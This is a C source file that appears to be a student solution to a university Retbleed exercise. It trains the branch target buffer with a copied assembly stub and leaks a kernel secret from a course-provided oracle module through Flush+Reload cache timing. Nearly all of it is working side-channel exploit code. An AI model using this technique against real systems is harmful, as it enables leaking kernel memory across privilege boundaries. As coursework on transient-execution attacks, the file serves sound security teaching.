#include "retbleed_oracle.h"
#include <stdio.h>
#include <stdlib.h>     // if you want to use aligned_alloc
#include <stdint.h>
#include <errno.h>
#include <unistd.h>
#include <sys/mman.h>   // if you want to use mmap
#include <signal.h>
#include <setjmp.h>
#include <stdatomic.h>
#include <ctype.h>
#include "retbleed-assignment.h"
#include <limits.h>
#include <x86intrin.h>

/*

Retbleed assignment user-space program.


*/

#define HUGEPAGE_SIZE (1<<21)

// #define MMAP_FLAGS MAP_POPULATE | MAP_ANON | MAP_PRIVATE
#define PROT_RWE    PROT_READ | PROT_WRITE | PROT_EXEC

void (*trainingFunction)(uint8_t*,uint8_t*,int);
#define CALL_OFFSET 0x40

void testFunc(volatile uint8_t* my_reload_buffer, uint8_t* my_secret_address) {
    printf("TEST  :%p    %p\n", my_reload_buffer, my_secret_address);
}

static void trainBTB(uint8_t* leak_gadget, uint8_t* secret_ptr, int repeat);
void disclose(volatile uint8_t* my_reload_buffer, uint8_t* my_secret_address);

static jmp_buf buf;

char *toySec = "beefcafe";

// when seg fault is raised just jump
void handle_segv(int sig) {
  (void)sig;
  sigset_t sigs;
  sigemptyset(&sigs);
  sigaddset(&sigs, sig);
  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
//   printf("handling segfaultf\n");
  longjmp(buf, 1);
}

unsigned long reload_and_flush(void *adrs) {
  // i don't know why but them being volatile caused a segfault
  unsigned long low1, low2, high1, high2, time;
  __asm__ __volatile__("mfence              \n\t"
                   "lfence              \n\t"
                   "rdtsc               \n\t" // read pre-access time
                   "mov %%rax, %0       \n\t" // store time lower bits
                   "mov %%rdx, %1       \n\t" // store time higher bits
                   "lfence              \n\t"
                   "mov (%4), %%rax     \n\t" // memory access
                   "lfence              \n\t" // wait for memory access
                   "rdtsc               \n\t" // read post-access time
                   "mov %%rax, %2       \n\t" // store time lower bits
                   "mov %%rdx, %3       \n\t" // store time higher bits
                   : "=r"(low1), "=r"(high1), "=r"(low2), "=r"(high2)
                   : "c"(adrs) // rcx for adrs
                   : "%rax", "%rbx", "%rdx");
  _mm_clflush(adrs);
  time = ((high2 << 32) ^ low2) - ((high1 << 32) ^ low1);
  return time;
}

int main(int argc, char* argv[])
{
    uintptr_t feature_flags = 0;
    (void)argc;
    int ret;
    
    /* This is a simple parameter parser for debugging flags */
    while (*++argv) {
        if (strcmp(*argv, "--no-random") == 0) {
            feature_flags |= ASSIGNMENT_OPTION_NO_RANDOM_POSITION;
        }
        else if (strcmp(*argv, "--architectural") == 0) {
            feature_flags |= ASSIGNMENT_OPTION_USE_ARCHITECTURAL_CALL;
        }
        else {
            printf("Unknown argument: %s\n", *argv);
            return -1;
        }
    }


    /* 
    
    We provide this function to open the oracle 
    
    Once the oracle is opened, you can issue ioctl calls to the device 
    We provide you with wrapper functions that hide the nitty-gritty implementation.
    Note that the oracle_open call opens the device and locks it - you cannot open the device twice (but you may copy the file descriptor!)
    Also, oracle_open() may randomize some parts of the challenge.
    It's best to call oracle_open() a single time per attempt.
    */
    int oracle_fd = oracle_open();
    if (oracle_fd < 0) {
        fprintf(stderr, "Could not open oracle. Error code %d\n", errno);
        return 1;
    }

    /* Find or allocate a suitable reload buffer - a (transparent) hugepage - here */
    uint8_t* reload_buffer /* = ...*/;
    // hugepage-sized to ensure hugepage allocated i.e. contiguous physically for kernel accessing
    if (posix_memalign((void**)&reload_buffer, HUGEPAGE_SIZE, HUGEPAGE_SIZE)) {
        printf("allocation failed\n");
        goto cleanup;
    }
    if (madvise(reload_buffer, HUGEPAGE_SIZE, MADV_HUGEPAGE)) {
        int errsv = errno;
        printf("madvise for hugepage failed with errno %d\n", errsv);
    }
    // printf("reload buffer allocated: %p\n", reload_buffer);
    // initialize reload buffer
    for (int j = 0; j < 256; j++) {
        int k = j;
        *(int*)&(reload_buffer[k << 12]) = k+26;
    }
    
    // Buffer for the BTB training function, so that it has identical trailing bits to spec gadget
    void* trainingBuffer;
    if (posix_memalign(&trainingBuffer, HUGEPAGE_SIZE, HUGEPAGE_SIZE)) {
        printf("training buffer allocation failed\n");
        free(reload_buffer);
        goto cleanup;
    }
    // mark buffer as executable
    if (mprotect(trainingBuffer, HUGEPAGE_SIZE, PROT_RWE)){
        free(reload_buffer);
        free(trainingBuffer);
        goto cleanup;
    }

    /*
    To help you with leaking, we allow you to specify a buffer address of your choice which the leaking code will access.
    By calling this function, you get the following values:
    - virtual_reload_buffer_address is filled with the kernel virtual address of this buffer (into the pagemap)
    - physical_reload_buffer_address is filled with the physical address of this buffer. This may be useful for debugging, but is not required for the exercise
    - secret_address is filled with the kernel virtual address of the secret you should leak. Treat it as an opaque value.

    We also passed the parsed flags into the secret.
    */
    uintptr_t virtual_reload_buffer_address = (uintptr_t)reload_buffer;
    uintptr_t physical_reload_buffer_address = 0x0;
    uintptr_t secret_address = 0x0;
    ret = oracle_initialize_secret(oracle_fd, &virtual_reload_buffer_address, &physical_reload_buffer_address, &secret_address, feature_flags);
    if (ret != 0) {
        fprintf(stderr, "Could not initialize secret. Error code %d (errno %d)\n", ret, errno);
        goto cleanup;
    }

    /*
    Obtain information about the functions in the kernel module.
    Refer to the exercise sheet for details about the addresses.
    */
    uintptr_t leak_gadget_address;
    uintptr_t spec_gadget_return_address;
    uintptr_t spec_gadget_recursive_call_address;

    ret = oracle_get_info(oracle_fd,
        &leak_gadget_address,
        &spec_gadget_return_address,
        &spec_gadget_recursive_call_address);
    if (ret != 0) {
        fprintf(stderr, "Could not obtain oracle information. Error code %d\n", ret);
        goto cleanup;
    }

    // printf("spec_return_addr:%lx\nspec_call_addr  :%lx\ndiff:%ld\n", 
    //         spec_gadget_return_address,
    //         spec_gadget_recursive_call_address,
    //         (unsigned long)spec_gadget_return_address-(unsigned long)spec_gadget_recursive_call_address);
    fflush(stdout);

    /*
    With the information, build the training space.
    The training space actually is very sparse, we just need a single training address
    which aliases with the kernel target address.
    */
   
    // compute target address to copy BTB training function
    trainingFunction = (void (*)(uint8_t*,uint8_t*,int)) (spec_gadget_return_address - CALL_OFFSET);
    trainingFunction = (void (*)(uint8_t*,uint8_t*,int)) (((unsigned long)trainingFunction) & (HUGEPAGE_SIZE-1));
    trainingFunction = (void (*)(uint8_t*,uint8_t*,int)) (((unsigned long)trainingBuffer) | ((unsigned long)trainingFunction));
    // printf("training buffer  :%12p\ntraining function:%12p\nspec_gadget_offset:%12p\n", 
    //         trainingBuffer,
    //         trainingFunction,
    //         (void *)(((unsigned long)trainingFunction) & (HUGEPAGE_SIZE-1)));
    // fflush(stdout);
    memcpy(trainingFunction, (void*) &trainBTB,  (((unsigned long) &disclose)- (unsigned long) &trainBTB));

    // trainBTB((void*)&testFunc, NULL, 2);

    /* Before executing, remember that you should prepare to handle segmentation violation faults (SIGSEGV) */
    
    // register segfault handler
    struct sigaction segv_act;
    segv_act.sa_handler = handle_segv;
    if (sigaction(SIGSEGV, &segv_act, NULL)) {
        printf("SegFault Handler setting failed\n");
    }

    // test argument availability
    // printf("target:%p    %p\n", (void*)&testFunc, (void*) secret_address);
    // if (!setjmp(buf)) {
    //     (*trainingFunction)((void*)&testFunc, (void*) secret_address, 2);
    // }
    
    // test executability of training function
    // printf("trying\n");
    // if (!setjmp(buf)) {
    //     (*trainingFunction)((void*)leak_gadget_address, (void*) secret_address, 2);
    // }
    // printf("success!\n\n");

    // TODO: sometimes a segfault occurs here. ?
    // printf("trying2\n");
    // if (!setjmp(buf)) {
    //     (*trainingFunction)((void*)leak_gadget_address, (void*) secret_address, 2);
    // }
    // printf("success!\n\n");
    /*
    Task: Flush+Reload your secret here.
    */

    // flush reload buffer
    for (int j = 0; j < 256; j++) {
        _mm_clflush(&reload_buffer[j << 12]);
    }

    uint8_t secret[SECRET_SIZE];
    /* Setup your exploit loop here*/
    unsigned long times[256], maxs[256];
    const int round = 10;
    // for (int i = 0; i < 4/*SECRET_SIZE*/; ++i) {
    for (int i = 0; i < SECRET_SIZE; ++i) {
        
        for (int j = 0; j < 256; j++) {
            times[j] = 0;
            maxs[j] = 0;
        }

        char *target = (char*) secret_address;
        target = &target[i];
        
        for (int tries = 0; tries < round; tries++) {
            for (int j=0; j<256; j++) {
                for (int k=0; k<5; ++k) {
                    // Train BTB to point to leaking gadget when ret 
                    if (!setjmp(buf)) {
                        (*trainingFunction)((void*)leak_gadget_address, (void*) target, 29);
                    }
                
                    /* 
                    Call the oracle to run a vulnerable function as described in the assignment sheet.
                    In the real world, you would have to find a suitable gadget that passes user-controlled arguments.
                    For this assignment, we tell you that you can use the arguments as specified to leak.
                    */
                    int r_ok = oracle_run_func(oracle_fd, 
                        /* argument 1: reload buffer base (kernel address)*/virtual_reload_buffer_address,
                        /* argument 2: Secret address to leak (kernel address)*/(uintptr_t)target, feature_flags);
                    if (r_ok != 0) {
                        fprintf(stderr, "Could not run function. Error code %d (errno %d)\n", r_ok, errno);
                        goto cleanup;
                    }
                }
            // for (int j=0; j<256; j++) {
                int k = ((j * 167) + (13+2*tries)) % 256;
                unsigned long time = reload_and_flush(&reload_buffer[k << 12]);
                times[k] += time;
                if (time > maxs[k])
                    maxs[k] = time;
            }
        }

        int secret_idx = 0;
        unsigned long min_time = ULONG_MAX;

        // for (int j = 0; j < 256; j++) {
        //     if (j%10==0)
        //         printf("\n%d", j/10);
        //     printf("\t%ld", times[j]/round);
        // }
        // printf("\n\n");

        // for (int j = 0; j < 256; j++) {
        //     if (j%10==0)
        //         printf("\n%2d", j/10);
        //     printf("   %4ld,%4ld", times[j]/round, maxs[j]);
        // }
        // printf("\n\n");

        for (int j = 0; j < 256; j++) {
            times[j] = (times[j]-maxs[j]) / (round-1);
            // if (j%10==0)
            //     printf("\n%d", j/10);
            // printf("\t%ld", times[j]);
            if (times[j] < min_time) {
                min_time = times[j];
                secret_idx = j;
            }
        }
        // printf("\n\n");
        secret[i] = secret_idx;
        // printf("byte %d: %d %ld\n", i, secret_idx, min_time);
    }



    /* Once you have found a secret, you may ask the oracle if the found secret is correct.
    This is not required, but may help you while debugging. Note that the points are fantasy-points.
    If you have 100 points or more in the end, chances are high that you have found the correct secret.
    If you have less than 100 points, but more than 0, the issue likely is that your exploit is not reliable enough,
    and you are not getting all bytes, but a majority is correct. 
    With 0 points, your attack generally does not work.
    Again: This does not proportionally correlate to the grade you will receive.
    */
    uint64_t points = 0;
    if (oracle_verify_secret(oracle_fd, secret, SECRET_SIZE, &points) != 0) {
        fprintf(stderr, "Could not verify secret. Error code %d (errno %d)\n", ret, errno);
    }

    /* Convenience function to print the found secret in an accepted format.
    You may also print your secret earlier, but make sure it is on the final line of your output.
    Use the verification program to check if your output meets the requirements.
    */
    printf("\nSecret found (%lu points): \n", points);
    for (size_t i = 0; i < SECRET_SIZE; i++) {
        printf("%02x ", secret[i]);
    }
    printf("\n");
    // for (size_t i = 0; i < SECRET_SIZE; i++) {
    //     printf("%c", (char) secret[i]);
    // }
    // printf("\n");

    free(reload_buffer);
    free(trainingBuffer);

cleanup:
   /* Cleanup the oracle */
   close(oracle_fd);
    
    return 0;
}

static void trainBTB(uint8_t* leak_gadget, uint8_t* secret_ptr, int repeat){
    // Push one leak_gadget, then 30 copies of same ret
    __asm__ __volatile__(
        "push %0        \n\t"
        "jmp b          \n\t" 
        "a:             \n\t" 
        "pop %%rax      \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "push %%rax     \n\t"
        "jmp c          \n\t" 
        "b:             \n\t" 
        "call a         \n\t" 
        "c:             \n\t" 
        "ret            \n\t" 
        :: "r" (leak_gadget) 
        :);
    return;
}

void disclose(volatile uint8_t* my_reload_buffer, uint8_t* my_secret_address) {
    uint8_t value = *my_secret_address;
    my_reload_buffer[value << 12];
}